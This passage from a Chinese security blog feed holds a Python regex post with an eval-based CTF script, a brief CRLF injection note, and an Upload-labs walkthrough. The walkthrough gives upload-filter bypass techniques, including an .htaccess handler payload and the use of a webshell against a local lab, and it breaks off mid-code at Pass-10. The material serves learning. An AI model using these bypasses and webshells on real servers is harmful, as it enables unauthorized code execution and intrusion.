可选标志。只影响括号中的区域。</td></tr><tr><td>(?: re)</td><td>类似 (…), 但是不表示一个组</td></tr><tr><td>(?imx: re)</td><td>在括号中使用i, m, 或 x 可选标志</td></tr><tr><td>(?-imx: re)</td><td>在括号中不使用i, m, 或 x 可选标志</td></tr><tr><td>(?#…)</td><td>注释.</td></tr><tr><td>(?= re)</td><td>前向肯定界定符。如果所含正则表达式，以 … 表示，在当前位置成功匹配时成功，否则失败。但一旦所含表达式已经尝试，匹配引擎根本没有提高；模式的剩余部分还要尝试界定符的右边。</td></tr><tr><td>(?! re)</td><td>前向否定界定符。与肯定界定符相反；当所含表达式不能在字符串当前位置匹配时成功</td></tr><tr><td>(?&gt; re)</td><td>匹配的独立模式，省去回溯。</td></tr><tr><td>\w</td><td>匹配字母数字及下划线</td></tr><tr><td>\W</td><td>匹配非字母数字及下划线</td></tr><tr><td>\s</td><td>匹配任意空白字符，等价于 [\t\n\r\f].</td></tr><tr><td>\S</td><td>匹配任意非空字符</td></tr><tr><td>\d</td><td>匹配任意数字，等价于 [0-9].</td></tr><tr><td>\D</td><td>匹配任意非数字</td></tr><tr><td>\A</td><td>匹配字符串开始</td></tr><tr><td>\Z</td><td>匹配字符串结束，如果是存在换行，只匹配到换行前的结束字符串。</td></tr><tr><td>\z</td><td>匹配字符串结束</td></tr><tr><td>\G</td><td>匹配最后匹配完成的位置。</td></tr><tr><td>\b</td><td>匹配一个单词边界，也就是指单词和空格间的位置。例如， ‘er\b’ 可以匹配”never” 中的 ‘er’，但不能匹配 “verb” 中的 ‘er’。</td></tr><tr><td>\B</td><td>匹配非单词边界。’er\B’ 能匹配 “verb” 中的 ‘er’，但不能匹配 “never” 中的 ‘er’。</td></tr><tr><td>\n, \t, 等.</td><td>匹配一个换行符。匹配一个制表符。等</td></tr><tr><td>\1…\9</td><td>匹配第n个分组的内容。</td></tr><tr><td>\10</td><td>匹配第n个分组的内容，如果它经匹配。否则指的是八进制字符码的表达式。</td></tr></tbody></table><h3 id="特殊字符类"><a href="#特殊字符类" class="headerlink" title="特殊字符类"></a>特殊字符类</h3><table><thead><tr><th>.</th><th>匹配除 “\n” 之外的任何单个字符。要匹配包括 ‘\n’ 在内的任何字符，请使用象 ‘[.\n]’ 的模式。</th></tr></thead><tbody><tr><td>\d</td><td>匹配一个数字字符。等价于 [0-9]。</td></tr><tr><td>\D</td><td>匹配一个非数字字符。等价于 [^0-9]。</td></tr><tr><td>\s</td><td>匹配任何空白字符，包括空格、制表符、换页符等等。等价于 [ \f\n\r\t\v]。</td></tr><tr><td>\S</td><td>匹配任何非空白字符。等价于 [^ \f\n\r\t\v]。</td></tr><tr><td>\w</td><td>匹配包括下划线的任何单词字符。等价于’[A-Za-z0-9_]’。</td></tr><tr><td>\W</td><td>匹配任何非单词字符。等价于 ‘[^A-Za-z0-9_]’。</td></tr></tbody></table><p>python str()函数  :</p><blockquote><p>str() 函数将对象转化为适于人阅读的形式。 </p></blockquote><blockquote><p> 表达式 .* 就是单个字符匹配任意次，即贪婪匹配。<br>表达式 .*? 是满足条件的情况只匹配一次，即最小匹配. </p></blockquote><p>python eval()函数</p><blockquote><p>eval() 函数用来执行一个字符串表达式，并返回表达式的值。</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> re<span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://123.206.31.85:10002/"</span> <span class="token comment" spellcheck="true">#获取URL</span>s <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 请求Session,保持算式不变</span>r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>textSs <span class="token operator">=</span> str<span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">"(.*?)&lt;/p>"</span><span class="token punctuation">,</span>r<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#获取表达式,对表达式进行切片</span>ans <span class="token operator">=</span> eval<span class="token punctuation">(</span>Ss<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#计算表达式的值</span>data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'result'</span><span class="token punctuation">:</span> ans<span class="token punctuation">}</span><span class="token comment" spellcheck="true">#POST计算结果,名字为result 在源码中可以看到</span>res <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#打印结果</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 语言学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CRLF注入</title>
      <link href="/posts/20191205/"/>
      <url>/posts/20191205/</url>
      
        <content type="html"><![CDATA[<h1 id="CRLF注入"><a href="#CRLF注入" class="headerlink" title="CRLF注入"></a>CRLF注入</h1><p>CRLF指的是回车符(CR,ASCII 13,\r,%0d)和换行符(LF,ASCII 10,\n,%0a)</p><h2 id="如何检测CRLF注入"><a href="#如何检测CRLF注入" class="headerlink" title="如何检测CRLF注入?"></a>如何检测CRLF注入?</h2><p>将恶意数据发送到Web应用程序,使其将恶意数据输出在HTTP响应头中</p><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p> 过滤 \r 、\n 之类的行结束符，避免输入的数据污染其他 HTTP 首部字段。 </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Upload-labs个人心得</title>
      <link href="/posts/20191204/"/>
      <url>/posts/20191204/</url>
      
        <content type="html"><![CDATA[<h1 id="Upload-labs个人心得"><a href="#Upload-labs个人心得" class="headerlink" title="Upload-labs个人心得"></a>Upload-labs个人心得</h1><h2 id="Pass-01-修改前端JS绕过检测"><a href="#Pass-01-修改前端JS绕过检测" class="headerlink" title="Pass-01:修改前端JS绕过检测"></a>Pass-01:修改前端JS绕过检测</h2><p>function checkFile(){}//使这个函数的参数为空,即让这个函数失效</p><p>然后访问图片地址,解析我们的一句话木马(webshell),在用蚁剑,发现连接成功</p><p><a href="http://127.0.0.1/upload-labs-master/upload/111.php" target="_blank" rel="noopener">http://127.0.0.1/upload-labs-master/upload/111.php</a></p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> file <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByName</span><span class="token punctuation">(</span><span class="token string">'upload_file'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>file <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> file <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"请选择要上传的文件!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//定义允许上传的文件类型</span>    <span class="token keyword">var</span> allow_ext <span class="token operator">=</span> <span class="token string">".jpg|.png|.gif"</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//提取上传文件的类型</span>    <span class="token keyword">var</span> ext_name <span class="token operator">=</span> file<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//判断上传文件类型是否允许上传</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>allow_ext<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>ext_name <span class="token operator">+</span> <span class="token string">"|"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">var</span> errMsg <span class="token operator">=</span> <span class="token string">"该文件不允许上传，请上传"</span> <span class="token operator">+</span> allow_ext <span class="token operator">+</span> <span class="token string">"类型的文件,当前文件类型为："</span> <span class="token operator">+</span> ext_name<span class="token punctuation">;</span>        <span class="token function">alert</span><span class="token punctuation">(</span>errMsg<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><a id="more"></a><h2 id="Pass-02-文件类型-后缀绕过-Content-Type"><a href="#Pass-02-文件类型-后缀绕过-Content-Type" class="headerlink" title="Pass-02:文件类型/后缀绕过(Content-Type)"></a>Pass-02:文件类型/后缀绕过(Content-Type)</h2><pre class=" language-php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'image/jpeg'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'image/png'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'image/gif'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'文件类型不正确，请重新上传！'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token punctuation">.</span><span class="token string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>这是一个白名单绕过的情况</p><p>在不看源代码的情况下(黑盒),一般都是先传一个图片然后改为可以被执行的php后缀(phtml,php2,……)</p><p>或者传一个PHP文件,改文件类型Content-Type</p><p><img src="/posts/20191204/C:%5CUsers%5C32028%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191130232107434.png" alt="image-20191130232107434"></p><p><img src="/posts/20191204/C:%5CUsers%5C32028%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191130232134107.png" alt="image-20191130232134107"></p><p>蚁剑能连接成功,就基本说明我们拿到shell了,pass</p><h2 id="Pass-03-文件后缀绕过"><a href="#Pass-03-文件后缀绕过" class="headerlink" title="Pass-03 文件后缀绕过"></a>Pass-03 文件后缀绕过</h2><p><img src="/posts/20191204/C:%5CUsers%5C32028%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191130233331125.png" alt="image-20191130233331125"></p><p>改文件后缀为php,发现不能穿asp,php,jsp,aspx文件</p><pre class=" language-php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'.asp'</span><span class="token punctuation">,</span><span class="token string">'.aspx'</span><span class="token punctuation">,</span><span class="token string">'.php'</span><span class="token punctuation">,</span><span class="token string">'.jsp'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//删除文件名末尾的点</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//转换为小写</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//去除字符串::$DATA</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//收尾去空</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string">"YmdHis"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                 <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'不允许上传.asp,.aspx,.php,.jsp后缀文件！'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>可以通过修改文件后缀为.phtml或者php2,php3…..绕过</p><p>然后这个代码里面的<strong>::$DATA  php在window的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名</strong> </p><p><img src="/posts/20191204/C:%5CUsers%5C32028%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191201000400673.png" alt="image-20191201000400673"></p><p>这里我不知道为什么我传上去看不到phpinfo的界面…</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span></code></pre><h2 id="Pass-04-传-htaccess利用Apache解析漏洞"><a href="#Pass-04-传-htaccess利用Apache解析漏洞" class="headerlink" title="Pass-04(传. htaccess利用Apache解析漏洞 )"></a>Pass-04(传. htaccess利用Apache解析漏洞 )</h2><p>这关,查看源代码,发现能过滤的基本都过滤了<br>.htaccess是Apache服务器的配置文件</p><p><strong>.htaccess是什么</strong></p><p>启用.htaccess，需要修改httpd.conf，启用AllowOverride，并可以用AllowOverride限制特定命令的使用。如果需要使用.htaccess以外的其他文件名，可以用AccessFileName指令来改变。例如，需要使用.config ，则可以在服务器配置文件中按以下方法配置：AccessFileName .config 。</p><p>笼统地说，.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。</p><p><strong>工作原理</strong></p><p>.htaccess文件(或者”分布式配置文件”)提供了针对每个目录改变配置的方法，即在一个特定的目录中放置一个包含指令的文件，其中的指令作用于此目录及其所有子目录。<br> 说明：<br> 如果需要使用.htaccess以外的其他文件名，可以用AccessFileName指令来改变。例如，需要使用.config ，则可以在服务器配置文件中按以下方法配置：<br> AccessFileName .config<br> 通常，.htaccess文件使用的配置语法和主配置文件一样。AllowOverride指令按类别决定了.htaccess文件中哪些指令才是有效的。如果一个指令允许在.htaccess中使用，那么在本手册的说明中，此指令会有一个覆盖项段，其中说明了为使此指令生效而必须在AllowOverride指令中设置的值。</p><p><a href="https://blog.csdn.net/cmzhuang/article/details/53537591" target="_blank" rel="noopener">https://blog.csdn.net/cmzhuang/article/details/53537591</a></p><blockquote><p>payload: SetHandler application/x-httpd-php</p><p>或者AddType application/x-httpd-php .jpg</p></blockquote><p>这样Apache就会把传的文件当做php解析,传个图片马就行</p><h2 id="Pass-05-大小写Php绕过"><a href="#Pass-05-大小写Php绕过" class="headerlink" title="Pass-05(大小写Php绕过)"></a>Pass-05(大小写Php绕过)</h2><p><img src="/posts/20191204/C:%5CUsers%5C32028%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191201152418017.png" alt="image-20191201152418017"></p><p>发现Php是可以传上去的,如果打CTF的时候,肯定是黑盒情况,所以我觉得是可以写一个文件后缀的字典来爆破可以传上去的后缀</p><p>查看源码发现没有      </p><pre class=" language-PHP"><code class="language-PHP">  $file_ext = strtolower($file_ext);//将文件后缀转为小写 </code></pre><p><img src="/posts/20191204/E:%5C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%80%BB%E7%BB%93%5Cimage-20191201153348214.png" alt="image-20191201153348214"></p><p>成功了 </p><h2 id="Pass-06-文件后缀名加空格绕过"><a href="#Pass-06-文件后缀名加空格绕过" class="headerlink" title="Pass-06(文件后缀名加空格绕过)"></a>Pass-06(文件后缀名加空格绕过)</h2><p>看源码发现没有去掉空格</p><pre class=" language-php"><code class="language-php"><span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//首尾去空</span></code></pre><p><img src="/posts/20191204/C:%5CUsers%5C32028%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191201154821870.png" alt="image-20191201154821870"></p><p>成功上传</p><p><img src="/posts/20191204/C:%5CUsers%5C32028%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191201155005069.png" alt="image-20191201155005069"></p><p>访问文件地址,php代码被执行</p><h2 id="Pass-07-利用Windows特性"><a href="#Pass-07-利用Windows特性" class="headerlink" title="Pass-07(利用Windows特性)"></a>Pass-07(利用Windows特性)</h2><p>Windows特性,自动去掉后缀名中最后的” . “ </p><pre class=" language-php"><code class="language-php"><span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//删除文件名末尾的点</span></code></pre><p><img src="/posts/20191204/C:%5CUsers%5C32028%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191201155456367.png" alt="image-20191201155456367"></p><p>本来先开始想的用%00截断.jpg然后访问地址.但是没有传上去如上图</p><p>正确姿势,如下图:</p><p><img src="/posts/20191204/C:%5CUsers%5C32028%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191201155853267.png" alt="image-20191201155853267"></p><p>然后访问文件地址,PHP代码被执行,也是phpinfo的界面.</p><h2 id="Pass-08-DATA数据流绕过"><a href="#Pass-08-DATA数据流绕过" class="headerlink" title="Pass-08(::$DATA数据流绕过)"></a>Pass-08(::$DATA数据流绕过)</h2><pre class=" language-php"><code class="language-php"><span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//去除字符串::$DATA</span></code></pre><p>在Pass-03中,这样写的<strong>::$DATA  php在window的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名</strong> </p><p><img src="/posts/20191204/C:%5CUsers%5C32028%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191201161237426.png" alt="image-20191201161237426"></p><p>然后访问上传文件的地址,但是要把::$DATA去掉</p><p>在PHP中 ::</p><p><img src="/posts/20191204/C:%5CUsers%5C32028%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191203003615111.png" alt="image-20191203003615111"></p><h2 id="Pass-09-文件名拼接-这个在黑盒情况下可能会有点难…"><a href="#Pass-09-文件名拼接-这个在黑盒情况下可能会有点难…" class="headerlink" title="Pass-09(文件名拼接,这个在黑盒情况下可能会有点难…)"></a>Pass-09(文件名拼接,这个在黑盒情况下可能会有点难…)</h2><pre class=" language-php"><code class="language-php"> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span></code></pre><pre class=" language-PHP"><code class="language-PHP">$img_path = UPLOAD_PATH.'/'.$file_name;</code></pre><p>这段代码告诉我们,返回的路径是UPLOAD_PATH + / + 被处理后的文件名</p><pre class=" language-php"><code class="language-php"><span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//删除文件名末尾的点</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//转换为小写</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//去除字符串::$DATA</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//首尾去空</span></code></pre><p>于是构造文件名为 php. . 被构造的文件名经过处理后,就是php.   因此又可以利用Windows特性成功上传</p><p><img src="/posts/20191204/C:%5CUsers%5C32028%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191201162928226.png" alt="image-20191201162928226"></p><h2 id="Pass-10-双写绕过"><a href="#Pass-10-双写绕过" class="headerlink" title="Pass-10(双写绕过)"></a>Pass-10(双写绕过)</h2><pre class=" language-php"><code class="language-php"> <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token variable">$deny_ext</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span 